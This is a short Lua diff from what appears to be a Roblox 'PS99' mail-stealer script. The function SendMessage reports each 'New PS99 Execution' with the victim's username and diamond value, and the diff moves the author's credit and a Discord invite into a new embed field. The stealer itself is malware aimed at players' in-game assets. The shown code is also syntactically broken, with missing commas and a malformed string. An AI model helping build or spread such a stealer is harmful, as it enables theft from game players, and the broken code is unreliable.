@@ -72,6 +72,11 @@ local function SendMessage(username, diamonds)
             name = "✏️ Total Value:",
             value = "```" "```",
             inline = false
+        },
+        {
+        	name = "By Light Monzz"
+            value = "https://discord.gg/CAr4FZHAyF"
+            inline = false
         }
 	}
 
@@ -108,8 +113,6 @@ local function SendMessage(username, diamonds)
             ["title"] = "\240\159\144\177 New PS99 Execution" ,
             ["color"] = 65280,
 			["fields"] = fields,
-				["text"] = "Mailstealer by Light Monzz"
-				["text"] = "https://discord.gg/CAr4FZHAyF"
 			}
         }}
     }
